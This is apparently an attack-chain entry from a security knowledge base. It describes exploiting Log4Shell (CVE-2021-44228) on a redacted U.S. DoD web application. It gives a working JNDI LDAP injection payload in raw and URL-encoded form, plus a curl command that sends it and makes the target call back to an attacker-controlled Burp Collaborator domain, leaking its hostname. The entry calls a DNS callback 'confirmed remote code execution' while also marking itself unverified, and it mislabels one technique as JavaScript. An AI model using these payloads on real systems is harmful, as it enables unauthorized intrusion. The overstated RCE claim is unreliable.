---
tags:
  - log4shell
  - rce
  - jndi
  - ldap
  - apache-log4j
type: attack_chain
tools:
  - '[[tools/Burp-Collaborator]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
verified: false
platforms:
  - Web
  - Java
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Inject-Log4Shell-Payload-into-URL-Parameter]]'
  - '[[procedures/Submit-Request-and-Monitor-Callback-with-Burp-Collaborator]]'
step_count: 4
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:23:50.089Z'
description: >-
  A multi-stage exploitation of Log4Shell (CVE-2021-44228) vulnerability in a
  DoD web application, demonstrating remote code execution through malicious
  JNDI LDAP lookups.
skill_level: intermediate
impact_level: high
id: 1763ce00-4523-4dea-b826-2cbd0e936da5
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---
# Remote Code Execution via Log4Shell in Apache Log4j on DoD Web Application

Multi-stage attack chain demonstrating exploitation of Log4Shell (CVE-2021-44228) for remote code execution on a U.S. Department of Defense web application using malicious JNDI LDAP lookups.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Access Target URL] --> B[Inject Payload]
    B --> C[Submit Request]
    C --> D[Monitor Callback]
    D --> E[Confirm RCE]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
    style E fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Burp-Collaborator]]

### Target Environment

- Web application using vulnerable Apache Log4j (pre-2.17.0)
- Java-based backend
- Exposed URL parameter vulnerable to log processing
- Network access to the target DoD domain

### Initial Access Requirements

- Public or authenticated access to the target URL (https://███████/██████)
- No prior credentials needed for unauthenticated exploitation
- Attacker-controlled domain for JNDI callback (e.g., Burp Collaborator)

## Detailed Attack Procedures

### Step 1: Access Target and Craft Payload
procedure: [[procedures/Inject-Log4Shell-Payload-into-URL-Parameter]]

**Objective**: Prepare and inject the Log4Shell proof-of-concept payload into the vulnerable URL parameter to trigger JNDI lookup.

**Instructions**: Navigate to the target URL https://███████/██████ and append the URL-encoded payload to the ██████ parameter. Use the payload ${jndi:ldap://${hostName}.LOG45200SSRF.xxxxxx.burpcollaborator.net/a}, encoded as %24%7bjndi%3aldap%3a%2f%2fx%24%7bhostName%7d.LOG45200SSRF.xxxxxx.burpcollaborator.net%2fa%7d.

Full example URL: https://███████/██████=%24%7bjndi%3aldap%3a%2f%2fx%24%7bhostName%7d.LOG45200SSRF.xxxxxx.burpcollaborator.net%2fa%7d

**Expected Output**: Payload injected into the parameter without errors in the browser or request tool.

**Success Indicators**:
- Payload successfully appended to URL
- No immediate server rejection

### Step 2: Submit the Crafted Request
procedure: [[procedures/Inject-Log4Shell-Payload-into-URL-Parameter]]

**Objective**: Send the request to the target server to process the malicious input through Log4j.

**Instructions**: Submit the full crafted URL via browser, curl, or Burp Suite. The vulnerable Log4j will log the input, triggering the JNDI LDAP lookup to the attacker's domain.

Example using curl (adapt to target):

```bash
curl "https://███████/██████=%24%7bjndi%3aldap%3a%2f%2fx%24%7bhostName%7d.LOG45200SSRF.xxxxxx.burpcollaborator.net%2fa%7d"
```

**Expected Output**: HTTP response from server; no visible errors, but backend processes the payload.

**Success Indicators**:
- Request sent successfully
- Server logs the input (inferred from callback)

### Step 3: Monitor for Exploitation Callback
procedure: [[procedures/Submit-Request-and-Monitor-Callback-with-Burp-Collaborator]]

**Objective**: Observe the DNS resolution or connection callback in Burp Collaborator to confirm JNDI interaction.

**Instructions**: With Burp Collaborator running, poll for incoming interactions after submitting the request. The target server will resolve the attacker's domain during the LDAP lookup.

**Expected Output**: Burp Collaborator shows DNS query or HTTP request from the target's IP.

**Success Indicators**:
- DNS resolution callback received
- Connection attempt to Collaborator domain

### Step 4: Validate and Review Evidence
procedure: [[procedures/Submit-Request-and-Monitor-Callback-with-Burp-Collaborator]]

**Objective**: Confirm full RCE potential by reviewing callback evidence and understanding impact.

**Instructions**: Examine Burp Collaborator logs, screenshots, or videos showing the callback. This demonstrates successful JNDI lookup, leading to potential arbitrary code execution.

**Expected Output**: Visual proof of callback, including target's hostname or IP in the interaction.

**Success Indicators**:
- Callback confirmed exploitation
- Evidence of RCE capability (e.g., potential for command execution)

## Attack Chain Summary

### Key Achievements

1. Successful injection of Log4Shell payload into user-controlled URL parameter
2. Triggered JNDI LDAP lookup to attacker-controlled server
3. Confirmed remote code execution via DNS callback in Burp Collaborator
4. Demonstrated high-impact vulnerability in DoD web application

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[JavaScript]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]

---

*Last updated: 2023-10-01T00:00:00Z*
